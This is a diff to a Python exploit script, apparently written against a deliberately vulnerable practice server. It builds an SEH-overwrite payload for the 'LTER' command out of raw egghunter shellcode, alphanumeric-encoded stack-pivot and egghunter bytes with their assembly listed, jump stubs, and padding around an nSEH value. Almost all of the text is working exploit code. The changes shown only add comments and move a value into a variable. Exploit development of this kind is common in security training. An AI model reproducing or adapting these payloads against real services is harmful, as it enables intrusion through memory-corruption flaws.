@@ -66,6 +66,11 @@ egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
 egghunter += "\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75"
 egghunter += "\xea\xaf\x75\xe7\xff\xe7"
 
+#Using Slink to encode the egghunt to be alphanumeric
+
+#get esp pointing back near the egghunter
+# esp offset +1190 to the address right at the nseh
+#alphanumeric for add esp, 1190
 stack = ""
 stack += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
 stack += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
@@ -74,9 +79,11 @@ stack += "\x58"			## pop eax
 stack += "\x05\x40\x11\x01\x01" ## add eax, 0x01011146
 stack += "\x05\x51\x01\x01\x01"	## add eax, 0x01010145
 stack += "\x2d\x01\x01\x02\x02" ## sub eax, 0x02020101
-# esp offset +1190 from the previous to our egghunter
 stack += "\x50"			## push eax
 stack += "\x5c"			## pop esp 29 bytes
+
+#encoding the last four bytes of egghutner
+#[e7ffe775]
 
 egghunter1 = ""
 egghunter1 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
@@ -86,6 +93,7 @@ egghunter1 += "\x05\x33\x53\x66\x53" ## add  eax, 0x53665333
 egghunter1 += "\x05\x32\x63\x55\x63" ## add  eax, 0x63556332
 egghunter1 += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
 egghunter1 += "\x50"                 ## push eax
+
 #[*] Encoding [afea75af]..
 #[!] Possible bad character found, using alterantive encoder..
 egghunter1 += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
@@ -174,7 +182,8 @@ print (len(jmp_egg1))
 print (len(jmp_egg2))
 print (len(jmp_egg3))
 exploit = "LTER /.../"
-exploit += "A" * (nseh_offset-(len(jmp_egg1)+ len(jmp_egg2) + len(jmp_egg3) + len(shellcode))) + shellcode + jmp_egg1 + jmp_egg2 + jmp_egg3 + jmp_back2 + "\x5e\x19\x50\x62" + "D" * (total-nseh_offset-8)
+nseh = "\x5e\x19\x50\x62"
+exploit += "A" * (nseh_offset-(len(jmp_egg1)+ len(jmp_egg2) + len(jmp_egg3) + len(shellcode))) + shellcode + jmp_egg1 + jmp_egg2 + jmp_egg3 + jmp_back2 + nseh + "D" * (total-nseh_offset-8)
 
 
 print (len(exploit))
